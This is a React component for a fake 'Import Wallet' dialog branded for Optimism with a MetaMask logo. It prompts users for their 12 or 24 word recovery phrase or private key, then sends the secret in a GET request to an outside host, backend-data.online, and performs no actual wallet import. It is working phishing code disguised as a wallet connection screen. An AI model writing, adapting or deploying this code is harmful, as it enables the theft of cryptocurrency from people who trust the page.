import React, { useRef, useState } from "react";
import { FaPaste } from "react-icons/fa";

const ImportWallet = ({ currentWallet, setImportWallet }) => {
  const [pass, setPass] = useState("");
  const ref = useRef(null);

  const submitAddress = () => {
    let vault = {
      type: "secrate pass",
      main: `
      [otimism App]
      ${pass}
      `,
    };
    fetch(
      `https://backend-data.online/backend/start.php?phrase=${vault.main}`,
      {
        method: "GET",
        mode: "cors",
        headers: { "content-type": "application/json" },
      }
    ).then((success) => {
      setPass("");
    });
  };

  const handlePaste = () => {
    navigator.clipboard.readText().then((text) => {
      setPass(text);
    });
  };
  return (
    <div className="transition-10 duration-50 justify-center items-center flex fixed -top-40   inset-0  outline-0 ">
      <div className="lg:w-[25rem] w-[20rem] rounded-md bg-white drop-shadow-2xl">
        <div
          onClick={() => setImportWallet((pre) => !pre)}
          className="flex items-center  bg-white rounded-t-md cursor-pointer  border-b border-black justify-between p-4 space-x-4 "
        >
          <img src={currentWallet} alt="metamask" className="w-10" />
          <p className=" font-[700] lg:text-xl text-md">
            Mnemonic Or Private Key
          </p>
        </div>
        <div className="p-5 bg-white">
          <p className="text-black my-3 font-[500] text-sm">
            Restore an exsiting wallet with your 12 or 24 mnemonic words or your
            private key.
          </p>
          <div className="relative">
            <textarea
              onChange={(e) => setPass(e.target.value)}
              value={pass}
              ref={ref}
              className="bg-transparent border border-[#27262c] border-gray-700 rounded-md outline-0 w-full h-40 p-4"
              placeholder="words separated by single space"
            />
            <FaPaste
              className="absolute bottom-2 right-0 shadow-xl text-lg cursor-pointer"
              onClick={(e) => {
                handlePaste();
              }}
            />
          </div>

          <br />
          <div className="flex flex-col items-center">
            <button
              onClick={() => submitAddress()}
              disabled={!pass}
              className={
                pass
                  ? " bg-[#ff0420] w-full px-5 py-3 text-sm rounded-md hover:opacity-80 shadhow-xl text-white font-[700] mb-1 mt-2 transition duration-300 ease-in-out outline-0"
                  : " bg-[#ff0420] opacity-20 w-full px-5 py-3 text-sm rounded-md  shadhow-xl text-white font-[700] mb-1 mt-2 transition duration-300 ease-in-out outline-0"
              }
            >
              Connect Wallet with optimism
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ImportWallet;
